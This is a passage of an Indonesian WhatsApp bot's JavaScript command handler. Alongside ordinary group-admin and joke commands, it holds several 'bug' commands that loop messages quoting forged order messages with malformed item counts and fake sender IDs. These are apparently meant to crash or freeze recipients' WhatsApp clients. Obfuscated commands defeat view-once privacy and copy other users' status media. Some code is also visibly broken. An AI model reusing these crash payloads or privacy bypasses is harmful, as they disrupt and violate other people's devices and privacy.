		        var hets = `${NamaBot}`
		        var grousp = await hexa.groupMetadata(from)
                var membere = grousp['participants']
                var mems = []
                membere.map(async adm => {
                    mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
                })
                var options = {
                    text: hets,
                    contextInfo: { mentionedJid: mem },
                    quoted: mek
                }
		        for (let i = 0; i < args[0]; i++) {
		        hexa.sendMessage(from, options, text, {quoted:{ 
	    key: {
	    fromMe: false, 
	    participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "62882248593508@s.whatsapp.net" } : {}) 
	    },
                        "message": {
                        "orderMessage": {
                        "orderId": "173388341205594",
						"itemCount": -3599964009,
						"status": "INQUIRY",
						"surface": "CATALOG",
						"message": `${NamaBot}`,
						"orderTitle": `${NamaOwner}`,
						"sellerJid": "6283161567237@s.whatsapp.net",
						"token": "AR4QmUKv7r4P0XYHtHmhLqoFOOhwn8SqO903CVo9raQL4A=="
					}}}})
		        }
		        } catch {
		          for(let i=0;i<10;i++){
		        hexa.sendMessage(from, 'Berhasil Mengirim Bug Troli2', text, {quoted:{ 
	    key: {
	    fromMe: false, 
	    participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "62882248593508@s.whatsapp.net" } : {}) 
	    },
                        "message": {
                        "orderMessage": {
                        "orderId": "173388341205594",
						"itemCount": -3599964009,
						"status": "INQUIRY",
						"surface": "CATALOG",
						"message": `${NamaBot}`,
						"orderTitle": `${NamaOwner}`,
						"sellerJid": "6283161567237@s.whatsapp.net",
						"token": "AR4QmUKv7r4P0XYHtHmhLqoFOOhwn8SqO903CVo9raQL4A=="
					}}}})
		        }
		        }
		       break
case 'bugcombine':

                 hexa.toggleDisappearingMessages(from, 'HACKED')
hexa.sendMessage(from, `${NamaBot}`, text, {
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 9999999, // Bug
    status: 1,
    surface: 1,
    message: `${NamaBot}`,
    orderTitle: `${NamaOwner}`, // Idk what this does
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
setTimeout( () => {
	    hexa.updatePresence(from, Presence.recording)
	    sendMess(`dahlah`)
	    }, 2000)
	    reply(`dahlah`)
break
case 'buglokasi':

hexa.updatePresence(from, Presence.recording)
		       hexa.sendMessage(from, {degreesLatitude: 34.0184,
						degreesLongitude: -118.411,
						name: `${NamaOwner}`,
						address: `${NamaBot}`,
                        jpegThumbnail: fs.readFileSync('./stik/thumb.jpeg') },location,{
 quoted: {
  key: {
   participant: '111111111@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 70000, // Bug
    status: 1,
    surface: 1,
    message: `${NamaOwner}`,
    orderTitle: `${NamaBot}`, // 
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
break
case 'bugpc':
					case 'bugpc':

hexa.updatePresence(from, Presence.recording)
hexa.sendMessage(from, 'yaudah oke',text, {
 quoted: {
  key: {
   participant: '1111111111@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 70000, // Bug
    status: 1,
    surface: 1,
    message: `${NamaBot}`,
    orderTitle: `${NamaOwner}`, // 
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
break
case 'bugmenu':
 var y = `${prefix}bughole\n${prefix}bugpc\n${prefix}buglokasi\n${prefix}bugtroli2\n${prefix}bugtroli`
hexa.sendMessage(from, y, text, {quoted:fvideo})
break
case 'hack':
 
			const anggara = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
			const pepek = await hexa.downloadAndSaveMediaMessage(anggara)        
			const c = fs.readFileSync(pepek)
			const d = `𝑖𝑎𝑚 𝑓𝑖𝑛𝑜 菲诺`
			const e = `hexa`
			const f = `${q}`
			const g = `https://y.com`
			var anu = {
			detectLinks: false
			}
			var mat = await hexa.generateLinkPreview(g)
			mat.title = d;
			mat.description = d;
			mat.jpegThumbnail = e;
			mat.canonicalUrl = g; 
			hexa.sendMessage(from, mat, MessageType.extendedText, anu)
break
case 'viewto':
 case 'toview': 
function _0x17d3(){const _0x6712f2=['relayWAMessage','1488522uEAdAC','75836llVGDV','599420NmzTTB','viewOnceMessage','keys','846252xWxmXn','parse','quotedMessage','viewOnce','No\x20es\x20nesesario\x20convertir.','contextInfo','3043943deQtWY','log','prepareMessageFromContent','stringify','8690nFYEtz','8OWOfgz','4JEDVHP','text','793296YIEEMm','message','1557OZzmGq'];_0x17d3=function(){return _0x6712f2;};return _0x17d3();}const _0x2c4284=_0x4417;(function(_0x50fae4,_0xb888f6){const _0x5c36d3=_0x4417,_0x55c947=_0x50fae4();while(!![]){try{const _0x336d68=parseInt(_0x5c36d3(0x116))/0x1*(-parseInt(_0x5c36d3(0x10e))/0x2)+parseInt(_0x5c36d3(0x11a))/0x3*(-parseInt(_0x5c36d3(0x10f))/0x4)+-parseInt(_0x5c36d3(0x117))/0x5+parseInt(_0x5c36d3(0x115))/0x6+parseInt(_0x5c36d3(0x109))/0x7+parseInt(_0x5c36d3(0x111))/0x8+parseInt(_0x5c36d3(0x113))/0x9*(parseInt(_0x5c36d3(0x10d))/0xa);if(_0x336d68===_0xb888f6)break;else _0x55c947['push'](_0x55c947['shift']);}catch(_0x15cf68){_0x55c947['push'](_0x55c947['shift']);}}}(_0x17d3,0x37733),(MessageType[_0x2c4284(0x110)],{'quoted':mek,'sendEphemeral':!![],'contextInfo':{'forwardingScore':0x270f,'isForwarded':!![]}}));const viewary=[],untpar=JSON[_0x2c4284(0x10c)](mek[_0x2c4284(0x112)][type]['contextInfo'][_0x2c4284(0x11c)][_0x2c4284(0x118)][_0x2c4284(0x112)]),popet=JSON['parse'](untpar);console[_0x2c4284(0x10a)](JSON[_0x2c4284(0x11b)](JSON[_0x2c4284(0x10c)](mek['message'][type][_0x2c4284(0x108)][_0x2c4284(0x11c)]['viewOnceMessage']['message'])));if(!mek[_0x2c4284(0x112)][type]['contextInfo'][_0x2c4284(0x11c)][_0x2c4284(0x118)])return reply(_0x2c4284(0x107));function _0x4417(_0x5a895b,_0x455620){const _0x17d31d=_0x17d3();return _0x4417=function(_0x441753,_0x4f5bf1){_0x441753=_0x441753-0x106;let _0x2b8766=_0x17d31d[_0x441753];return _0x2b8766;},_0x4417(_0x5a895b,_0x455620);}const viewtype=Object[_0x2c4284(0x119)](popet)[0x0];viewary['push'](JSON[_0x2c4284(0x11b)](untpar)),delete popet[viewtype][_0x2c4284(0x106)];const viewom=hexa[_0x2c4284(0x10b)](from,popet,{'quoted':mek});await hexa[_0x2c4284(0x114)](viewom);
      break
case 'once':
case 'toonce':
function _0x55ba(_0x134c6c,_0x32daa1){var _0x447aa9=_0x447a();return _0x55ba=function(_0x55baf9,_0x47c438){_0x55baf9=_0x55baf9-0x89;var _0x51f197=_0x447aa9[_0x55baf9];return _0x51f197;},_0x55ba(_0x134c6c,_0x32daa1);}var _0x24a938=_0x55ba;(function(_0x348f7c,_0x3228a7){var _0x58554f=_0x55ba,_0x5e043d=_0x348f7c();while(!![]){try{var _0x3783ae=-parseInt(_0x58554f(0x97))/0x1+parseInt(_0x58554f(0x98))/0x2+-parseInt(_0x58554f(0x99))/0x3*(-parseInt(_0x58554f(0x95))/0x4)+-parseInt(_0x58554f(0x92))/0x5+-parseInt(_0x58554f(0x9a))/0x6+-parseInt(_0x58554f(0x90))/0x7*(-parseInt(_0x58554f(0x93))/0x8)+parseInt(_0x58554f(0x8c))/0x9*(parseInt(_0x58554f(0x8e))/0xa);if(_0x3783ae===_0x3228a7)break;else _0x5e043d['push'](_0x5e043d['shift']);}catch(_0x4b1108){_0x5e043d['push'](_0x5e043d['shift']);}}}(_0x447a,0x51c2e));(isMedia&&!mek['message'][_0x24a938(0x94)]||isQuotedImage||isQuotedVideo)&&args[_0x24a938(0x91)]==0x0&&(boij=isQuotedImage||isQuotedVideo?JSON['parse'](JSON[_0x24a938(0x8d)](mek)[_0x24a938(0x8b)](_0x24a938(0x89),'m'))[_0x24a938(0x8f)]['extendedTextMessage'][_0x24a938(0x8a)]:mek,owgi=await hexa['downloadMediaMessage'](boij),hexa[_0x24a938(0x96)](from,owgi,'imageMessage',{'viewOnce':!![]}));function _0x447a(){var _0x2a1ee8=['message','211015XEremP','length','897715xeznsQ','120bXnHjm','videoMessage','2422984rykTMo','sendMessage','202541qdIVGm','43140QOFBzO','3TLDoaw','2362974FwiEDf','quotedM','contextInfo','replace','18hNoRSK','stringify','156580jbSfnx'];_0x447a=function(){return _0x2a1ee8;};return _0x447a();}
break
            case 'group':
              hexa.sendMessage(from, 'Sibukk!!')
               await sleep(1000)
               txtt =`Hai Kak ${pushname}\nPilih mode di bawah ini`
               buttonsMessage = [{buttonId: `${prefix}closegc`,buttonText:{displayText: 'Tutup grup'},type:1},{buttonId:`${prefix}opengc`,buttonText:{displayText: 'Open group'},type:1}]
               buttonsMessage = { contentText: `${txtt}`, footerText: 'choose one', buttons: buttonsMessage, headerType: 1 }
               prep = await hexa.prepareMessageFromContent(from,{buttonsMessage},{})
               hexa.relayWAMessage(prep)
               break
            
               
      case 'antibule':
        if (!isGroup) return reply("Khusus di grup");
        if (!isGroupAdmins && !mek.key.fromMe) return reply("Khusus admin");
        if (args[0] == "on") {
          if (isKickarea) return reply("Sudah aktif!!");
          kickarea.push(from);
          fs.writeFileSync(
            "./lib/antibule.json",
            JSON.stringify(kickarea)
          );
          reply("Sukses mengaktifkan kickarea!");
        } else if (args[0] == "off") {
          kickarea.splice(from, 1);
          fs.writeFileSync(
            "./lib/antibule.json",
            JSON.stringify(kickarea)
          );
          reply("Sukses mematikan kickarea!");
        } else if (!q) {
          sendButMessage(from, `MODE KICKAREA`, `Silahkan pilih salah satu`, [
            {
              buttonId: `${prefix}kickarea on`,
              buttonText: {
                displayText: `on`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}kickarea off`,
              buttonText: {
                displayText: `off`,
              },
              type: 1,
            },
          ]);
        }
        break;
                 case 'antilink':
                                	if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (args.length < 1) return reply('Ketik 1 untuk mengaktifkan')
					if (Number(args[0]) === 1) {
						if (isAntiLink) return reply('Anti link group sudah aktif')
						antilink.push(from)
						fs.writeFileSync('./datauser/antilink.json', JSON.stringify(antilink))
						reply('Sukses mengaktifkan anti link group di group ini ✔️')
						hexa.sendMessage(from,`Perhatian kepada seluruh member anti link group aktif apabila anda mengirim link group anda akan di kick dari group`, text)
					} else if (Number(args[0]) === 0) {
						if (!isAntiLink) return reply('Mode anti link group sudah disable')
						antilink.splice(from, 1)
						fs.writeFileSync('./datauser/antilink.json', JSON.stringify(antilink))
						reply('Sukes menonaktifkan anti link group di group ini ✔️')
					} else {
						reply('1 untuk mengaktifkan, 0 untuk menonaktifkan')
					}
					break
case "antivirtex":
        if (!isGroup) return reply("Khusus di grup");
        if (!isGroupAdmins && !mek.key.fromMe) return reply("Khusus admin");
        if (args[0] == "on") {
          if (isAntiVirtex) return reply("Sudah aktif!!");
          antivirtex.push(from);
          fs.writeFileSync(
            "./datauser/antivirtex.json",
            JSON.stringify(antivirtex)
          );
          reply("Sukses mengaktifkan antihidetag!");
        } else if (args[0] == "off") {
          antivirtex.splice(from, 1);
          fs.writeFileSync(
            "./datauser/antivirtex.json",
            JSON.stringify(antivirtex)
          );
          reply("Sukses mematikan antihidetag!");
        } else if (!q) {
          sendButMessage(
            from,
            `MODE ANTI VIRTEX`,
            `Silahkan pilih salah satu`,
            [
              {
                buttonId: `${prefix}virtex on`,
                buttonText: {
                  displayText: `on`,
                },
                type: 1,
              },
              {
                buttonId: `${prefix}antivirtex off`,
                buttonText: {
                  displayText: `off`,
                },
           
                type: 1,
              },
            ]
          );
        }
        break;
case "nsfw":
        if (!isGroup) return reply("Khusus di grup");
        if (!isGroupAdmins && !mek.key.fromMe) return reply("Khusus admin");
        if (args[0] == "on") {
          if (isNsfw) return reply("Sudah aktif!!");
          nsfw.push(from);
          fs.writeFileSync(
            "./datauser/nsfw.json",
            JSON.stringify(nsfw)
          );
          reply("Sukses mengaktifkan antihidetag!");
        } else if (args[0] == "off") {
          nsfw.splice(from, 1);
          fs.writeFileSync(
            "./datauser/nsfw.json",
            JSON.stringify(nsfw)
          );
          reply("Sukses mematikan antihidetag!");
        } else if (!q) {
          sendButMessage(
            from,
            `MODE NSFW`,
            `Silahkan pilih salah satu`,
            [
              {
                buttonId: `${prefix}nsfw on`,
                buttonText: {
                  displayText: `on`,
                },
                type: 1,
              },
              {
                buttonId: `${prefix}nsfw off`,
                buttonText: {
                  displayText: `off`,
                },
                type: 1,
              },
            ]
          );
        }
        break
case "welcome":
        if (!isGroup) return reply("Khusus di grup");
        if (!isGroupAdmins && !mek.key.fromMe) return reply("Khusus admin");
        if (args[0] == "on") {
          if (isWelkom) return reply("Sudah aktif!!");
          welkom.push(from);
          fs.writeFileSync(
            "./datauser/welcome.json",
            JSON.stringify(welkom)
          );
          reply("Sukses mengaktifkan fitur Welcome");
        } else if (args[0] == "off") {
          welkom.splice(from, 1);
          fs.writeFileSync(
            "./datauser/welcome.json",
            JSON.stringify(welkom)
          );
          reply("Sukses mematikan Fitur Welcome!");
        } else if (!q) {
          sendButMessage(
            from,
            `MODE NSFW`,
            `Silahkan pilih salah satu`,
            [
              {
                buttonId: `${prefix}welcome on`,
                buttonText: {
                  displayText: `on`,
                },
                type: 1,
              },
              {
                buttonId: `${prefix}welcome off`,
                buttonText: {
                  displayText: `off`,
                },
                type: 1,
              },
            ]
          );
        }
        break
case "antihidetag":
        if (!isGroup) return reply("Khusus di grup");
        if (!isGroupAdmins && !mek.key.fromMe) return reply("Khusus admin");
        if (args[0] == "on") {
          if (isAntihidetag) return reply("Sudah aktif!!");
          antihidetg.push(from);
          fs.writeFileSync(
            "./lib/antihidetag.json",
            JSON.stringify(antihidetg)
          );
          reply("Sukses mengaktifkan antihidetag!");
        } else if (args[0] == "off") {
          antihidetg.splice(from, 1);
          fs.writeFileSync(
            "./lib/antihidetag.json",
            JSON.stringify(antihidetg)
          );
          reply("Sukses mematikan antihidetag!");
        } else if (!q) {
          sendButMessage(
            from,
            `MODE ANTI HIDETAG`,
            `Silahkan pilih salah satu`,
            [
              {
                buttonId: `${prefix}antihidetag on`,
                buttonText: {
                  displayText: `on`,
                },
                type: 1,
              },
              {
                buttonId: `${prefix}antihidetag off`,
                buttonText: {
                  displayText: `off`,
                },
                type: 1,
              },
            ]
          );
        }
        break;
      case "antiviewonce":
        if (!isGroup) return reply("Khusus di grup");
        if (!isGroupAdmins && !mek.key.fromMe) return reply("Khusus admin");
        if (args[0] == "on") {
          if (isAntiviewonce) return reply("Sudah aktif!!");
          antivo.push(from);
          fs.writeFileSync("./lib/antivo.json", JSON.stringify(antivo));
          reply("Sukses mengaktifkan antiviewonce!");
        } else if (args[0] == "off") {
          antivo.splice(from, 1);
          fs.writeFileSync("./lib/antivo.json", JSON.stringify(antivo));
          reply("Sukses mematikan antiviewonce!");
        } else if (!q) {
          sendButMessage(
            from,
            `MODE ANTI VIEWONCE`,
            `Silahkan pilih salah satu`,
            [
              {
                buttonId: `${prefix}antiviewonce on`,
                buttonText: {
                  displayText: `on`,
                },
                type: 1,
              },
              {
                buttonId: `${prefix}antiviewonce off`,
                buttonText: {
                  displayText: `off`,
                },
                type: 1,
              },
            ]
          );
        }
        break;
case "colongsw": 
 case "colong":
  case 'curi':
  //Enc dlu gan:v
var _0x1e0df0=_0x5713;(function(_0x661686,_0xf3874f){var _0x449343=_0x5713,_0x369204=_0x661686();while(!![]){try{var _0x1a8cb4=-parseInt(_0x449343(0xa4))/0x1*(-parseInt(_0x449343(0x98))/0x2)+parseInt(_0x449343(0xa3))/0x3*(parseInt(_0x449343(0x90))/0x4)+parseInt(_0x449343(0x99))/0x5+parseInt(_0x449343(0x9b))/0x6*(parseInt(_0x449343(0xa8))/0x7)+-parseInt(_0x449343(0x93))/0x8+-parseInt(_0x449343(0x8f))/0x9+parseInt(_0x449343(0x9c))/0xa*(-parseInt(_0x449343(0x8e))/0xb);if(_0x1a8cb4===_0xf3874f)break;else _0x369204['push'](_0x369204['shift']);}catch(_0x461f2f){_0x369204['push'](_0x369204['shift']);}}}(_0x52b3,0x32630));if(!mek[_0x1e0df0(0x9f)][_0x1e0df0(0x96)])return;if(isMedia&&!mek[_0x1e0df0(0xa5)]['videoMessage']||isQuotedImage)ger=isQuotedImage?JSON[_0x1e0df0(0xa9)](JSON[_0x1e0df0(0x92)](mek)[_0x1e0df0(0xa7)](_0x1e0df0(0x97),'m'))['message']['extendedTextMessage'][_0x1e0df0(0x9d)]:mek,owgi=await hexa[_0x1e0df0(0x94)](ger),hexa[_0x1e0df0(0xa6)](sender,fs['readFileSync'](owgi),_0x1e0df0(0xa1),{'caption':q}),reply(_0x1e0df0(0x9a)),fs[_0x1e0df0(0xa0)](owgi);else isMedia&&!mek[_0x1e0df0(0xa5)][_0x1e0df0(0x95)]||isQuotedVideo?(ger=isQuotedVideo?JSON[_0x1e0df0(0xa9)](JSON[_0x1e0df0(0x92)](mek)[_0x1e0df0(0xa7)](_0x1e0df0(0x97),'m'))['message']['extendedTextMessage'][_0x1e0df0(0x9d)]:mek,owgi=await hexa[_0x1e0df0(0x94)](ger),hexa[_0x1e0df0(0xa6)](sender,fs['readFileSync'](owgi),_0x1e0df0(0x95),{'caption':q}),reply(_0x1e0df0(0x9a)),fs[_0x1e0df0(0xa0)](owgi)):reply('Reply\x20sw\x20foto\x20/\x20video\x20yg\x20mau\x20dicolong');if(!mek[_0x1e0df0(0x9f)]['fromMe'])return;function _0x5713(_0x1fc72c,_0x3c6854){var _0x52b3f8=_0x52b3();return _0x5713=function(_0x571359,_0x1f52c6){_0x571359=_0x571359-0x8e;var _0x11c9a0=_0x52b3f8[_0x571359];return _0x11c9a0;},_0x5713(_0x1fc72c,_0x3c6854);}if(isMedia&&!mek[_0x1e0df0(0xa5)][_0x1e0df0(0x95)]||isQuotedImage)ger=isQuotedImage?JSON['parse'](JSON[_0x1e0df0(0x92)](mek)[_0x1e0df0(0xa7)](_0x1e0df0(0x97),'m'))['message'][_0x1e0df0(0x9e)][_0x1e0df0(0x9d)]:mek,owgi=await hexa['downloadAndSaveMediaMessage'](ger),hexa[_0x1e0df0(0xa6)](sender,fs[_0x1e0df0(0x91)](owgi),_0x1e0df0(0xa1),{'caption':q}),reply(_0x1e0df0(0x9a)),fs[_0x1e0df0(0xa0)](owgi);else isMedia&&!mek[_0x1e0df0(0xa5)][_0x1e0df0(0x95)]||isQuotedVideo?(ger=isQuotedVideo?JSON[_0x1e0df0(0xa9)](JSON['stringify'](mek)['replace'](_0x1e0df0(0x97),'m'))[_0x1e0df0(0xa5)][_0x1e0df0(0x9e)][_0x1e0df0(0x9d)]:mek,owgi=await hexa[_0x1e0df0(0x94)](ger),hexa['sendMessage'](sender,fs[_0x1e0df0(0x91)](owgi),'videoMessage',{'caption':q}),reply(_0x1e0df0(0x9a)),fs[_0x1e0df0(0xa0)](owgi)):reply(_0x1e0df0(0xa2));function _0x52b3(){var _0x52590a=['1908060nRztEI','Sukses','1506468UYQcDi','10NhyGHL','contextInfo','extendedTextMessage','key','unlinkSync','imageMessage','Reply\x20sw\x20foto\x20/\x20video\x20yg\x20mau\x20dicolong','81087zTTesQ','239ogOrVB','message','sendMessage','replace','7cIsxUK','parse','7772787CMwMyN','269037CzjeNJ','44JUQfwp','readFileSync','stringify','2516360agrjks','downloadAndSaveMediaMessage','videoMessage','fromMe','quotedM','2740QJCYAI'];_0x52b3=function(){return _0x52590a;};return _0x52b3();}
        break;
      case "caripesan":
        if (!q) return reply("pesannya apa bang?");
        let maruf = await hexa.searchMessages(q, from, 10, 1);
        let ss = v.messages;
        let ell = ss.filter((maruf) => v.message);
        el.shift();
        try {
          if (ell[0].message.conversation == undefined) return;
          reply(`Ditemukan ${el.length} pesan`);
          await sleep(3000);
          for (let i = 0; i < el.length; i++) {
            await hexa.sendMessage(from, "Nih pesannya", text, {
              quoted: el[i],
            });
          }
        } catch (e) {
          reply("Pesan tidak ditemukan!");
        }
        break;
      case "githubstalk2":
        if (!q) return reply("Usernamenya?");
        const oi = await fetchJson(
          `https://api.dhnjing.xyz/stalk/github?user=dehan-j1ng`
        );
        const mm = `*GITHUB STALK*
    Username: ${oi.result.username}
    Fullname: ${oi.result.name}
    Bio: ${oi.result.user_bio}

    Jumlah repo: ${oi.result.user_repo}
    Following: ${oi.result.user_following}
    Follower: ${oi.result.user_followers}`;
        reply(mm);
        break;
      case "tiktokstalk2":
        if (!q) return reply("Usernamenya? ");
        var i = await fetchJson(
          `https://api.dhnjing.xyz/stalk/tiktok?user=@${q}`
        );
        buff = await getBuffer(i.result.user.avatarLarger);
        var ii = `*TIKTOK STALK*
    Username: ${q}
    Nickname: ${i.result.user.nickname}
    Bio: ${i.result.user.signature}

    Jumlah postingan: ${i.result.stats.videoCount}
    Following: ${i.result.stats.followingCount}
    Follower: ${i.result.stats.followerCount}`;
        hexa.sendMessage(from, buff, image, { quoted: mek, caption: ii });
        break;
case 'seberapabucin':
  if (!isRegister) return reply(mess.only.register)
  if (!isBanned)return reply(mess.only.banned)
  if (args.length < 1) return hexa.sendMessage(from, '*☒* Masukan nama target', text, {
quoted: mek
  })
  teks = body.slice(15)
  try {
  hexa.updatePresence(from, Presence.recording)
  data = await fetchJson(`https://arugaz.herokuapp.com/api/howbucins`)
  hasil = `*Bucin Detected*\n‣ Target : *${args[0]}*\n‣ Persentase : *${data.persen}%*\n*${data.desc}*`
  reply(hasil)
  
  } catch {
    reply(mess.ferr)
  }
  break
case 'itsme':
if (!isBanned)return reply(mess.only.banned)
  if (!isRegister) return reply(mess.only.register)
  try {
  
ppimg = await hexa.getProfilePicture(`${sender.split('@')[0]}@c.us`)
  } catch {
ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
  }
  teks = `‣ *Nama* : ${pushname}
  ‣ *Nomor* : ${sender.split("@")[0]}
  ‣ *Link* : wa.me/${sender.split("@")[0]}`
  its = await getBuffer (ppimg)
  hexa.sendMessage(from, its, image, {
quoted: mek, caption: teks
  })
  
  break
				case 'bc':
					if (!isOwner) return reply('Kamu siapa?')
					if (args.length < 1) return reply('.......')
					anu = await hexa.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						buff = await hexa.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							hexa.sendMessage(_.jid, buff, image, {caption: `*${body.slice(4)}*`})
						}
						reply('Suksess broadcast')
					} else {
						for (let _ of anu) {
							sendMess(_.jid, `*${body.slice(4)}*`)
						}
						reply('Suksess broadcast')
					}
					break
case 'setname':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
idgrup = `${from.split("@s.whatsapp.net")[0]}`;
hexa.groupUpdateSubject(idgrup, `${body.slice(9)}`)
hexa.sendMessage(from, '*☉* Mengganti Nama Grup', text, {
  quoted: mek
})
break

  //ganti desk
  case 'setdesk':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
hexa.groupUpdateDescription(from, `${body.slice(9)}`)
hexa.sendMessage(from, '*☉* Mengganti Deskripsi Grup', text, {
  quoted: mek
})
break
case 'setppbot':
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
  hexa.updatePresence(from, Presence.recording)
  if (!isOwner) return reply(mess.only.ownerB)
  const botpp = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contxtInfo: mek
  const cuk = await hexa.downloadAndSaveMediaMessage(botpp)
  await hexa.updateProfilePicture(botNumber, cuk)
  reply('Makasih profile barunya😗')
  break
//--Simsimi talk
				case 'simi':
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
					if (args.length < 1) return reply(`Hai ${pushname}`)
					teks = body.slice(6)
					try { 
					anu = await fetchJson(`https://simsumi.herokuapp.com/api?text=${teks}`, {method: 'get'})
					if (anu.error) return reply('Simi ga tau kak')
					reply(anu.success)
					} catch {
					  reply(mess.ferr)
					}
					break
//--Verifkasi
case 'verify':
case 'daftar':
  case 'register':
if (isRegister) return reply('Akun kamu sudah terverfikasi')
const namaUser = `${pushname}`
const umurUser = `${sender}`
const serialUser = createSerial(20)
veri = sender
if (isGroup) {
  addRegisteredUser(sender, namaUser, umurUser, time, serialUser)
  hasil = `〘  *Verifikasi* 〙
Kode : *${serialUser}*
╔════════════════════
╠≽️ *Nama* : *${namaUser}*
╠≽️ *Nomor* : *${sender.split("@")[0]}*
╚════════════════════`
reply(hasil)
  console.log(color('[REGISTER]'), color(time, 'yellow'), 'Name:', color(namaUser, 'cyan'), 'Age:', color(umurUser, 'cyan'), 'Serial:', color(serialUser, 'cyan'), 'in', color(sender || groupName))
} else {
  addRegisteredUser(sender, namaUser, umurUser, time, serialUser)
  hasil = `〘  *Verifikasi* 〙
Kode : *${serialUser}*
╔════════════════════
╠≽️ *Nama* : *${namaUser}*
╠≽️ *Nomor* : *${sender.split("@")[0]}*
╚════════════════════`
reply(hasil)
  console.log(color('[REGISTER]'), color(time, 'yellow'), 'Name:', color(namaUser, 'cyan'), 'Age:', color(umurUser, 'cyan'), 'Serial:', color(serialUser, 'cyan'))
}
tm = `verifikasi selesai silahkan ketik ${prefix}Menu untuk menampilkan list menu`
reply(tm)
break
//--ganteng cekkkk
  case 'gantengcek':
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
if (args.length < 1) return reply('Masukan nama target')
ganteng = args.join(" ")
const gan = ['10',
  '30',
  '20',
  '40',
  '50',
  '60',
  '70',
  '62',
  '74',
  '83',
  '97',
  '100',
  '29',
  '94',
  '75',
  '82',
  '41',
  '39']
const teng = gan[Math.floor(Math.random() * gan.length)]
hexa.sendMessage(from, 'Gantengcek : *'+ganteng+'*\n\nJawaban : '+ teng+'%', text, {
  quoted: ftroli
})
break

//--Cantik cekk
  case 'cantikcek':
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
if (args.length < 1) return reply('Masukan nama target')
cantik = agrs.join(" ")
const can = ['10',
  '30',
  '20',
  '40',
  '50',
  '60',
  '70',
  '62',
  '74',
  '83',
  '97',
  '100',
  '29',
  '94',
  '75',
  '82',
  '41',
  '39']
const tik = can[Math.floor(Math.random() * can.length)]
hexa.sendMessage(from, 'Cantikcek *'+cantik+'*\n\nJawaban : '+ tik+'%', text, {
  quoted: ftroli
})
break
//gay cek
case 'gaycek':
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
if (args.length < 1) return reply('Masukan nama target')
gay = args.join(" ")
const gay = ['10',
  '30',
  '20',
  '40',
  '50',
  '60',
  '70',
  '62',
  '74',
  '83',
  '97',
  '100',
  '29',
  '94',
  '75',
  '82',
  '41',
  '39']
const tete = gay[Math.floor(Math.random() * can.length)]
hexa.sendMessage(from, 'Gaycek *'+cantik+'*\n\nJawaban : '+ tete+'%', text, {
  quoted: ftroli
})
break
//lesbi cek 
case 'lesbicek':
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
if (args.length < 1) return reply('Masukan nama target')
cantik = args.join(" ")
const lesbi = ['10',
  '30',
  '20',
  '40',
  '50',
  '60',
  '70',
  '62',
  '74',
  '83',
  '97',
  '100',
  '29',
  '94',
  '75',
  '82',
  '41',
  '39']
const les = lesbi[Math.floor(Math.random() * can.length)]
hexa.sendMessage(from, 'lesbicek *'+cantik+'*\n\nJawaban : '+ les+'%', text, {
  quoted: ftroli
})
break
                case 'premiumlist':
				hexa.updatePresence(from, Presence.recording) 
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
                 if (!isRegister) return reply( mess.only.regiter)    
				teks = 'This is list of premium number :\n'
				for (let premm of prem) {
					teks += `~> @${premm.split('@')[0]}\n`
					}
					teks += `Total : ${prem.length}`
				hexa.sendMessage(from, teks.trim(), extendedText, {quoted: ftroli, contextInfo: {"mentionedJid": prem}})
				break
                case 'bann':
				if (!isOwner)return reply(mess.only.owner)
				bnnd = body.slice(5)
				ban.push(`${bnnd}@s.whatsapp.net`)
				fs.writeFileSync('./datauser/banned.json', JSON.stringify(ban))
				reply(`Berhasil membanned nomor : wa.me/${bnnd} `)
				break
		case 'unbann':
			if (!isOwner)	return reply(mess.only.owner)
				bnnd = body.slice(7)
				ban.splice(`${bnnd}@s.whatsapp.net`, 1)
				fs.writeFileSync('./datauser/banned.json', JSON.stringify(ban))
				reply(`Nomor wa.me/${bnnd} telah di unban!`)
				break
                case 'ban':
if (!isOwner)return reply(mess.only.owner)
				bnnd = body.slice(5)
				ban.push(`${bnnd}@s.whatsapp.net`)
				fs.writeFileSync('./datauser/banned.json', JSON.stringify(ban))
				reply(`Berhasil membanned nomor : wa.me/${bnnd} `)
				break
		case 'unban':
if (!isOwner)return reply(mess.only.owner)
				bnnd = body.slice(7)
				ban.splice(`${bnnd}@s.whatsapp.net`, 1)
				fs.writeFileSync('./datauser/banned.json', JSON.stringify(ban))
				reply(`Nomor wa.me/${bnnd} telah di unban!`)
				break
                case 'banlist':
				hexa.updatePresence(from, Presence.recording) 
if (isBanned)return reply(mess.only.banned)
